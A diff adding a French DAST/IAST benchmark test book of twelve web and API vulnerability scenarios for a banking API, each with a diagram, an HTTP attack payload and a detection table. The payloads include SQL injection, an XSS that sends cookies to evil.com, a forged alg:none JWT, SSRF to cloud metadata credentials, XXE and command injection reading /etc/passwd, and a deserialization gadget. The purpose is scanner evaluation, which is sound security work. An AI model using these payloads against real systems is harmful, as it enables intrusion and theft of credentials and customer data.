@@ -1,1 +1,534 @@
+# PSC26 - Cahier de Test Benchmark DAST / IAST
+## Scenarios de Vulnerabilites - La Banque Postale
+
+Referentiels : OWASP Top 10 2021 | OWASP API Security Top 10 2023 | CWE/SANS Top 25
+
+---
+
+## SCENARIO SC-01 -- Injection SQL via parametre API
+**OWASP API3:2023 / A03:2021 | CWE-89 | Severite : CRITICAL**
+
+### Contexte
+
+Une API de recherche de comptes construit sa requete SQL par concatenation directe du parametre `q` sans PreparedStatement. L'attaquant injecte du SQL pour extraire l'ensemble de la table.
+
+### Diagramme
+
+```mermaid
+sequenceDiagram
+    participant A as Attaquant
+    participant API as API /accounts/search
+    participant DB as Base de donnees
+
+    A->>API: GET ?q=' OR '1'='1
+    API->>DB: SELECT * FROM accounts WHERE name='' OR '1'='1'
+    DB-->>API: Tous les comptes (dump complet)
+    API-->>A: HTTP 200 - liste complete des comptes
+```
+
+### Payload
+
+```http
+GET /api/v1/accounts/search?q=%27+OR+%271%27%3D%271 HTTP/1.1
+Host: api.banking.internal
+Authorization: Bearer eyJhbGciOiJIUzI1NiJ9...
+Accept: application/json
+```
+
+### Detection
+
+|               | DAST | IAST |
+|---------------|------|------|
+| **Detecte ?** | OUI  | OUI  |
+| **Comment**   | Detecte via analyse comportementale : le payload SQLi retourne plus de resultats qu'une requete neutre. Finding : CWE-89, API3:2023, CVSS 9.8. | Trace source = HttpServletRequest.getParameter('q') -> sink = Statement.execute() sans PreparedStatement. Taint non sanitise atteignant le sink SQL. Zero FP. |
+
+---
+
+## SCENARIO SC-02 -- Cross-Site Scripting (XSS) Reflechi
+**OWASP A03:2021 | CWE-79 | Severite : HIGH**
+
+### Contexte
+
+Un endpoint de recherche reflechit le parametre `term` directement dans la reponse HTML sans echappement contextuel. L'attaquant injecte du JavaScript qui s'execute dans le navigateur de la victime.
+
+### Diagramme
+
+```mermaid
+sequenceDiagram
+    participant A as Attaquant
+    participant API as API /search
+    participant V as Victime (navigateur)
+
+    A->>V: Envoie un lien piege avec payload XSS
+    V->>API: GET /search?term=<script>document.location='http://evil.com?c='+document.cookie</script>
+    API-->>V: HTTP 200 - payload reflechi sans echappement dans le HTML
+    Note over V: Script execute - cookie vole
+```
+
+### Payload
+
+```http
+GET /api/v1/search?term=<script>document.location='http://evil.com?c='+document.cookie</script> HTTP/1.1
+Host: api.banking.internal
+Authorization: Bearer eyJhbGciOiJIUzI1NiJ9...
+Accept: text/html
+```
+
+### Detection
+
+|               | DAST | IAST |
+|---------------|------|------|
+| **Detecte ?** | OUI  | OUI  |
+| **Comment**   | Payload XSS retrouve non encode dans la reponse HTTP. Finding : CWE-79, A03:2021. Verification contexte HTML et attribut. | Trace : getParameter('term') -> response.write() sans HtmlUtils.htmlEscape(). Taint injecte dans le flux de sortie HTML. |
+
+---
+
+## SCENARIO SC-03 -- BOLA / IDOR sur identifiant de compte
+**OWASP API1:2023 | CWE-284 | Severite : CRITICAL**
+
+### Contexte
+
+Un endpoint de consultation de compte utilise un identifiant numerique sequentiel sans verifier que le compte appartient a l'utilisateur authentifie. L'attaquant incremente l'ID pour acceder aux comptes d'autres clients.
+
+### Diagramme
+
+```mermaid
+sequenceDiagram
+    participant A as Attaquant (token userA)
+    participant API as API /accounts/{id}
+    participant DB as Base de donnees
+
+    A->>API: GET /accounts/1001 (son propre compte - OK)
+    API-->>A: HTTP 200 - compte userA
+
+    A->>API: GET /accounts/1002 (compte d'un autre client)
+    Note over API: Pas de verification d'appartenance
+    API->>DB: SELECT * FROM accounts WHERE id=1002
+    DB-->>API: Compte userB
+    API-->>A: HTTP 200 - compte userB (acces non autorise)
+```
+
+### Payload
+
+```http
+GET /api/v1/accounts/1002 HTTP/1.1
+Host: api.banking.internal
+Authorization: Bearer eyJhbGciOiJIUzI1NiJ9...
+Accept: application/json
+```
+
+### Detection
+
+|               | DAST | IAST |
+|---------------|------|------|
+| **Detecte ?** | PARTIEL | OUI |
+| **Comment**   | Necessite la configuration de deux comptes de test distincts. Le DAST detecte si la reponse avec le token userA sur l'ID de userB retourne HTTP 200 avec des donnees. Faux negatifs possibles si les IDs ne sont pas sequentiels. | Trace : token JWT parse (sub=userA) vs account.ownerId=userB dans la requete DB. Absence de verification d'appartenance avant le SELECT. Finding certain, zero FP. |
+
+---
+
+## SCENARIO SC-04 -- JWT avec algorithme none / secret faible
+**OWASP API2:2023 / A07:2021 | CWE-287 | Severite : CRITICAL**
+
+### Contexte
+
+L'API accepte des tokens JWT sans valider correctement l'algorithme de signature. L'attaquant forge un token avec `alg: none` ou avec un secret HMAC previsible pour usurper l'identite d'un administrateur.
+
+### Diagramme
+
+```mermaid
+sequenceDiagram
+    participant A as Attaquant
+    participant API as API /admin/users
+
+    A->>A: Forge un JWT : header={alg:none} payload={sub:admin,role:ADMIN}
+    A->>API: GET /admin/users avec token forge
+    Note over API: Verifie signature -- alg=none accepte
+    API-->>A: HTTP 200 - liste complete des utilisateurs admin
+```
+
+### Payload
+
+```http
+GET /api/v1/admin/users HTTP/1.1
+Host: api.banking.internal
+Authorization: Bearer eyJhbGciOiJub25lIn0.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJBRE1JTiJ9.
+Accept: application/json
+```
+
+### Detection
+
+|               | DAST | IAST |
+|---------------|------|------|
+| **Detecte ?** | OUI  | OUI  |
+| **Comment**   | Le DAST forge et envoie un token avec alg=none. Si HTTP 200 recu, finding confirme. Test egalement avec secret HMAC commun (secret, password, 123456). Finding : CWE-287, API2:2023. | Trace : JWT decode sans verification de signature dans la chaine d'appel. Detection de l'appel a Jwts.parser() sans .setSigningKey(). Sink non protege. |
+
+---
+
+## SCENARIO SC-05 -- Server-Side Request Forgery (SSRF)
+**OWASP A10:2021 / API7:2023 | CWE-918 | Severite : HIGH**
+
+### Contexte
+
+Un endpoint de generation de rapport accepte une URL fournie par l'utilisateur pour recuperer un logo ou une ressource externe. L'attaquant fournit une URL interne pour acceder aux metadonnees cloud ou aux services internes non exposes.
+
+### Diagramme
+
+```mermaid
+sequenceDiagram
+    participant A as Attaquant
+    participant API as API /reports/generate
+    participant INT as Service interne (169.254.169.254)
+
+    A->>API: POST /reports/generate {logoUrl: "http://169.254.169.254/latest/meta-data/"}
+    API->>INT: GET http://169.254.169.254/latest/meta-data/
+    INT-->>API: Metadonnees AWS (IAM credentials, etc.)
+    API-->>A: HTTP 200 - contenu des metadonnees cloud
+```
+
+### Payload
+
+```http
+POST /api/v1/reports/generate HTTP/1.1
+Host: api.banking.internal
+Authorization: Bearer eyJhbGciOiJIUzI1NiJ9...
+Content-Type: application/json
+
+{
+  "reportName": "test",
+  "logoUrl": "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
+}
+```
+
+### Detection
+
+|               | DAST | IAST |
+|---------------|------|------|
+| **Detecte ?** | OUI  | OUI  |
+| **Comment**   | Test avec URL metadata AWS/Azure, adresses RFC1918 (10.x, 192.168.x) et localhost. Si la reponse contient du contenu interne, finding SSRF confirme. CWE-918, A10:2021. | Trace : getParameter/body -> URL.openConnection() ou HttpClient.execute() sans validation allowlist. Detection du flux taint depuis le body JSON jusqu'au sink HTTP outbound. |
+
+---
+
+## SCENARIO SC-06 -- XML External Entity (XXE)
+**OWASP A05:2021 | CWE-611 | Severite : HIGH**
+
+### Contexte
+
+Un endpoint acceptant du XML en entree n'a pas desactive le traitement des entites externes. L'attaquant injecte une DTD externe pour lire des fichiers sensibles du serveur ou declencher un SSRF.
+
+### Diagramme
+
+```mermaid
+sequenceDiagram
+    participant A as Attaquant
+    participant API as API /payments/import
+    participant FS as Systeme de fichiers serveur
+
+    A->>API: POST XML avec DTD malicieuse (entite &xxe;)
+    API->>FS: Lecture de /etc/passwd via entite externe
+    FS-->>API: Contenu du fichier
+    API-->>A: HTTP 200 - contenu de /etc/passwd dans la reponse
+```
+
+### Payload
+
+```http
+POST /api/v1/payments/import HTTP/1.1
+Host: api.banking.internal
+Authorization: Bearer eyJhbGciOiJIUzI1NiJ9...
+Content-Type: application/xml
+
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE payment [
+  <!ELEMENT payment ANY>
+  <!ENTITY xxe SYSTEM "file:///etc/passwd">
+]>
+<payment>
+  <amount>&xxe;</amount>
+  <iban>FR7612345600012345678901</iban>
+</payment>
+```
+
+### Detection
+
+|               | DAST | IAST |
+|---------------|------|------|
+| **Detecte ?** | OUI  | OUI  |
+| **Comment**   | Le DAST injecte une DTD avec entite file:// et http://. Si le contenu du fichier ou une requete sortante est detectee, finding confirme. CWE-611, A05:2021. | Detection de l'instanciation de DocumentBuilderFactory sans setFeature(DISALLOW_DOCTYPE_DECL, true). Sink : parse() avec DTD externe non desactivee. |
+
+---
+
+## SCENARIO SC-07 -- Mass Assignment sur objet utilisateur
+**OWASP API3:2023 | CWE-915 | Severite : HIGH**
+
+### Contexte
+
+Un endpoint de mise a jour du profil utilisateur bind directement le body JSON sur l'objet metier sans filtrage des champs. L'attaquant ajoute des champs non prevus (role, isAdmin) pour s'auto-promouvoir.
+
+### Diagramme
+
+```mermaid
+sequenceDiagram
+    participant A as Attaquant
+    participant API as API /users/profile
+    participant DB as Base de donnees
+
+    A->>API: PATCH /users/profile {name: "test", role: "ADMIN", isAdmin: true}
+    Note over API: Binding direct sans DTO - tous les champs acceptes
+    API->>DB: UPDATE users SET name='test', role='ADMIN', isAdmin=true WHERE id=42
+    DB-->>API: OK
+    API-->>A: HTTP 200 - profil mis a jour avec role ADMIN
+```
+
+### Payload
+
+```http
+PATCH /api/v1/users/profile HTTP/1.1
+Host: api.banking.internal
+Authorization: Bearer eyJhbGciOiJIUzI1NiJ9...
+Content-Type: application/json
+
+{
+  "name": "test",
+  "email": "test@test.com",
+  "role": "ADMIN",
+  "isAdmin": true,
+  "creditLimit": 999999
+}
+```
+
+### Detection
+
+|               | DAST | IAST |
+|---------------|------|------|
+| **Detecte ?** | PARTIEL | OUI |
+| **Comment**   | Le DAST peut detecter si les champs injectes sont refletes dans une requete GET subsequente. Necessite une configuration de test specifique avec connaissance du schema. Faux negatifs frequents. | Detection du binding direct @RequestBody vers entite JPA sans @JsonIgnore ou DTO intermediaire. Trace depuis le body deserialise jusqu'au save() en base sans filtrage de champs. |
+
+---
+
+## SCENARIO SC-08 -- CORS mal configure
+**OWASP A05:2021 / API8:2023 | CWE-942 | Severite : HIGH**
+
+### Contexte
+
+L'API reflechit dynamiquement l'en-tete `Origin` sans validation. N'importe quel domaine peut effectuer des requetes cross-origin authentifiees, permettant a un site malveillant de voler des donnees bancaires via le navigateur de la victime.
+
+### Diagramme
+
+```mermaid
+sequenceDiagram
+    participant V as Victime (navigateur)
+    participant E as Site evil.com
+    participant API as API /accounts
+
+    V->>E: Visite evil.com
+    E->>V: Page avec script fetch() vers api.banking.internal
+    V->>API: GET /accounts (avec cookies session)
+    Note over API: Origin: evil.com reflechi dans Access-Control-Allow-Origin
+    API-->>V: HTTP 200 + Access-Control-Allow-Origin: evil.com
+    V-->>E: Donnees bancaires transmises a evil.com
+```
+
+### Payload
+
+```http
+GET /api/v1/accounts HTTP/1.1
+Host: api.banking.internal
+Origin: https://evil.com
+Authorization: Bearer eyJhbGciOiJIUzI1NiJ9...
+```
+
+### Detection
+
+|               | DAST | IAST |
+|---------------|------|------|
+| **Detecte ?** | OUI  | OUI  |
+| **Comment**   | Le DAST envoie un Origin arbitraire et verifie si Access-Control-Allow-Origin reflechit la valeur injectee. Si oui + Access-Control-Allow-Credentials: true, finding CRITICAL. CWE-942. | Detection de la valeur du header Origin propagee directement dans la reponse Access-Control-Allow-Origin sans validation par allowlist. Taint depuis request.getHeader('Origin') vers response.setHeader(). |
+
+---
+
+## SCENARIO SC-09 -- Injection de commande OS via parametre
+**OWASP A03:2021 | CWE-78 | Severite : CRITICAL**
+
+### Contexte
+
+Un endpoint de generation de rapport appelle un binaire systeme en concatenant un parametre utilisateur dans la commande shell. L'attaquant injecte des metacaracteres shell pour executer des commandes arbitraires.
+
+### Diagramme
+
+```mermaid
+sequenceDiagram
+    participant A as Attaquant
+    participant API as API /reports/export
+    participant OS as Systeme d'exploitation
+
+    A->>API: POST {format: "pdf; cat /etc/passwd"}
+    API->>OS: Runtime.exec("convert report.html pdf; cat /etc/passwd")
+    OS-->>API: Contenu de /etc/passwd
+    API-->>A: HTTP 200 - sortie de la commande injectee
+```
+
+### Payload
+
+```http
+POST /api/v1/reports/export HTTP/1.1
+Host: api.banking.internal
+Authorization: Bearer eyJhbGciOiJIUzI1NiJ9...
+Content-Type: application/json
+
+{
+  "reportId": "2024-Q1",
+  "format": "pdf; id; cat /etc/passwd"
+}
+```
+
+### Detection
+
+|               | DAST | IAST |
+|---------------|------|------|
+| **Detecte ?** | OUI  | OUI  |
+| **Comment**   | Le DAST injecte des metacaracteres shell (;, &&, |, backtick) et analyse la reponse. Si la sortie de commande est detectee ou si un delai anormal est observe (blind injection), finding confirme. CWE-78. | Trace : body JSON -> Runtime.exec() ou ProcessBuilder sans sanitisation. Detection du taint depuis le parametre utilisateur jusqu'au sink d'execution de commande OS. |
+
+---
+
+## SCENARIO SC-10 -- Path Traversal sur endpoint de fichier
+**OWASP A01:2021 | CWE-22 | Severite : HIGH**
+
+### Contexte
+
+Un endpoint de telechargement de justificatif de paiement construit le chemin de fichier en concatenant directement le parametre utilisateur. L'attaquant utilise des sequences `../` pour sortir du repertoire autorise et lire des fichiers systeme.
+
+### Diagramme
+
+```mermaid
+sequenceDiagram
+    participant A as Attaquant
+    participant API as API /documents/download
+    participant FS as Systeme de fichiers
+
+    A->>API: GET /documents/download?file=../../etc/passwd
+    API->>FS: open("/var/docs/../../etc/passwd")
+    FS-->>API: Contenu de /etc/passwd
+    API-->>A: HTTP 200 - fichier systeme retourne
+```
+
+### Payload
+
+```http
+GET /api/v1/documents/download?file=../../etc/passwd HTTP/1.1
+Host: api.banking.internal
+Authorization: Bearer eyJhbGciOiJIUzI1NiJ9...
+```
+
+### Detection
+
+|               | DAST | IAST |
+|---------------|------|------|
+| **Detecte ?** | OUI  | OUI  |
+| **Comment**   | Le DAST injecte des sequences traversal (../, ..\, encodees %2e%2e%2f). Si le contenu d'un fichier systeme est retrouve dans la reponse, finding confirme. CWE-22, A01:2021. | Trace : getParameter('file') -> new File(basePath + param) sans canonicalPath() ni validation de prefixe. Detection du taint jusqu'au sink FileInputStream ou Files.readAllBytes(). |
+
+---
+
+## SCENARIO SC-11 -- Broken Authentication - Absence de rate limiting sur login
+**OWASP API4:2023 / A07:2021 | CWE-307 | Severite : HIGH**
+
+### Contexte
+
+L'endpoint d'authentification ne limite pas le nombre de tentatives. Un attaquant peut effectuer une attaque par force brute ou credential stuffing pour compromettre des comptes clients bancaires.
+
+### Diagramme
+
+```mermaid
+sequenceDiagram
+    participant A as Attaquant
+    participant API as API /auth/token
+
+    loop 10 000 tentatives sans blocage
+        A->>API: POST {username: "client@lbp.fr", password: "candidat"}
+        API-->>A: HTTP 401 ou HTTP 200
+    end
+    Note over A: Aucun lockout - aucun CAPTCHA - aucun delai
+```
+
+### Payload
+
+```http
+POST /api/v1/auth/token HTTP/1.1
+Host: api.banking.internal
+Content-Type: application/json
+
+{
+  "username": "client@lbp.fr",
+  "password": "Password1234"
+}
+```
+
+### Detection
+
+|               | DAST | IAST |
+|---------------|------|------|
+| **Detecte ?** | OUI  | PARTIEL |
+| **Comment**   | Le DAST envoie N requetes consecutives et verifie l'absence de blocage (HTTP 429, Retry-After). Si aucun rate limiting apres 50+ tentatives, finding confirme. CWE-307, API4:2023. | Detection possible si le IAST observe l'absence d'appel a un service de rate limiting dans la chaine d'authentification. Moins fiable que le DAST sur ce scenario comportemental. |
+
+---
+
+## SCENARIO SC-12 -- Deserialization non securisee
+**OWASP A08:2021 | CWE-502 | Severite : CRITICAL**
+
+### Contexte
+
+Un endpoint accepte des objets Java serialises (ou JSON avec typage dynamique Jackson) sans validation de type. L'attaquant soumet un gadget chain pour executer du code arbitraire sur le serveur.
+
+### Diagramme
+
+```mermaid
+sequenceDiagram
+    participant A as Attaquant
+    participant API as API /session/restore
+    participant JVM as JVM serveur
+
+    A->>A: Construit un gadget chain (ysoserial CommonsCollections)
+    A->>API: POST payload serialise malicieux (base64)
+    API->>JVM: ObjectInputStream.readObject(payload)
+    JVM-->>API: Execution de code arbitraire (RCE)
+    API-->>A: HTTP 500 ou callback out-of-band confirme
+```
+
+### Payload
+
+```http
+POST /api/v1/session/restore HTTP/1.1
+Host: api.banking.internal
+Authorization: Bearer eyJhbGciOiJIUzI1NiJ9...
+Content-Type: application/octet-stream
+
+rO0ABXNyAC5vcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMuZnVuY3RvcnMuSW52b2tlcl...
+```
+
+### Detection
+
+|               | DAST | IAST |
+|---------------|------|------|
+| **Detecte ?** | PARTIEL | OUI |
+| **Comment**   | Le DAST peut soumettre des payloads ysoserial et detecter des callbacks DNS/HTTP out-of-band (via Burp Collaborator ou Interactsh). Necessite une configuration specifique. Faux negatifs possibles. | Detection directe de ObjectInputStream.readObject() recevant des donnees non fiables sans validation de type (allowlist). Taint depuis le body de la requete jusqu'au sink de deserialisation. Finding certain. |
+
+---
+
+## Synthese - Matrice de detection DAST / IAST
+
+| Scenario | Vulnerabilite | Severite | DAST | IAST | Fiabilite DAST | Fiabilite IAST |
+|----------|--------------|----------|------|------|----------------|----------------|
+| SC-01 | SQL Injection | CRITICAL | OUI | OUI | Haute | Haute |
+| SC-02 | XSS Reflechi | HIGH | OUI | OUI | Haute | Haute |
+| SC-03 | BOLA / IDOR | CRITICAL | PARTIEL | OUI | Moyenne | Haute |
+| SC-04 | JWT alg none | CRITICAL | OUI | OUI | Haute | Haute |
+| SC-05 | SSRF | HIGH | OUI | OUI | Haute | Haute |
+| SC-06 | XXE | HIGH | OUI | OUI | Haute | Haute |
+| SC-07 | Mass Assignment | HIGH | PARTIEL | OUI | Faible | Haute |
+| SC-08 | CORS | HIGH | OUI | OUI | Haute | Haute |
+| SC-09 | Command Injection | CRITICAL | OUI | OUI | Haute | Haute |
+| SC-10 | Path Traversal | HIGH | OUI | OUI | Haute | Haute |
+| SC-11 | Brute Force / Rate Limiting | HIGH | OUI | PARTIEL | Haute | Faible |
+| SC-12 | Deserialization | CRITICAL | PARTIEL | OUI | Faible | Haute |
+
+**Conclusion** : Le DAST excelle sur les vulnerabilites comportementales (SQLi, XSS, SSRF, Rate Limiting). Le IAST est superieur sur les vulnerabilites structurelles necessitant l'analyse du code en runtime (BOLA, Mass Assignment, Deserialization). La combinaison DAST + IAST offre une couverture complementaire et maximale.
 
